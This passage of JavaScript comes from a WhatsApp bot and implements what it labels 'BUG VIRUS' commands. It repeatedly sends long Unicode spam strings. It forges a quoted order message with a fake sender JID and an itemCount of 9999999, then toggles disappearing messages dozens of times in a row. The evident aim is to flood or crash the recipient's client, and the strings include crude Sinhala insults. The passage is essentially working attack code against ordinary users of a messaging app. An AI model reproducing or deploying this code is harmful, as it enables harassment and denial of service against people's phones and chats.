‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏🔥'
				pirtex8 = 'hyper mod තමා😌'
				pirtex9 = '✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘'
				pirtex10 = '✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷  ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘   https://youtube.com/c/HYPERMOD ✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷HYPER_✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷  ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘   https://youtube.com/c/HYPERMOD ✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷HYPER_✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷  ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘   https://youtube.com/c/HYPERMOD ✘͢͢ۦོ͢⇣͢✰͢↬ÂмHYPER^^O̷ ꦿ⃕O̷HYPER_✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘  ✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬Âмhyper^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘' 			
				reply(pirtex1)
				reply(pirtex2)
				reply(pirtex3)
				reply(pirtex4)
				reply(pirtex5)
				reply(pirtex6)
				reply(pirtex7)
				reply(pirtex8)
				reply(pirtex9)
				reply(pirtex10)
				reply(pirtex1)
				reply(pirtex2)
				reply(pirtex3)
				reply(pirtex4)
				reply(pirtex5)
				reply(pirtex6)
				reply(pirtex7)
				reply(pirtex8)
				reply(pirtex9)
				reply(pirtex10)
				reply(pirtex1)
				reply(pirtex2)
				reply(pirtex3)
				reply(pirtex4)
				reply(pirtex5)
				reply(pirtex6)
				reply(pirtex7)
				reply(pirtex8)
				reply(pirtex9)
				reply(pirtex10)
				reply(pirtex1)
				reply(pirtex2)
				reply(pirtex3)
				reply(pirtex4)
				reply(pirtex5)
				reply(pirtex6)
				reply(pirtex7)
				reply(pirtex8)
				reply(pirtex9)
				reply(pirtex10)
				reply(pirtex1)
				reply(pirtex2)
				reply(pirtex3)
				reply(pirtex4)
				reply(pirtex5)
				reply(pirtex6)
				reply(pirtex7)
				reply(pirtex8)
				reply(pirtex9)
				reply(pirtex10)
				break
				case 'hyperdgx': 
				if (!isOwner) return reply(mess.only.ownerB)
hypermod.sendMessage(mek.key.remoteJid, '👾BUG VIRUS BY ⏤͟͟͞͞ΔᏂᎥքɛᏒ ᎷodsΔ͟͟͟͟͞͞͞͞⏤👾', MessageType.extendedText, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: 'හයිපර් තමා හුත්තෝ',
    orderTitle: 'BY NURUTOMO ', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
break
				case 'hypernamsthe': 
				if (!isOwner) return reply(mess.only.ownerB)
hypermod.sendMessage(mek.key.remoteJid, 'නමස්තේ නමස්කාරම් කියල පටන් ගන්නම් ඇහ්༒⃝😂💦᭄ දුවන්නනම් එපා😹 💦⃝৫⃟➤᭄᭄̊̊̊̊࿓࿔ ක්ක්ක්ක්ක්ක්ක්🤣💦✤⃝ꦿ⃝✥᭄ꦿ 😂⃝৫⃟➤᭄᭄̊̊̊̊࿓࿔✾ـٰٰٰٰٖٖٖٖٜ۬ـٰٰٰٖٖٖٜ۬ـٰٰٖٖٜ۬ـٰٖٜ۬ـٰٖٜ۬ـٰٰٖٖٜ۬ـٰٰٰٖٖٖٜ۬ـٰٰٰٰٖٖٖٖٜ۬ـٰٰٰٖٖٖٜ۬ـٰٰٖٖٜ۬ـٰٖٜ۬ـٰٖٜ۬ـٰٰٖٖٜ۬ـٰٰٰٖٖٖٜ۬ـٰٰٰٰٖٖٖٖٜ۬✾➣🤣🌹⃝༂࿓࿔❤️⃝➤⃟̱̱̱̱̄̄̄', MessageType.extendedText, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: 'හයිපර් තමා හුත්තෝ😎',
    orderTitle: 'BY NURUTOMO ', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
hypermod.toggleDisappearingMessages(from,`MODAR`,text)
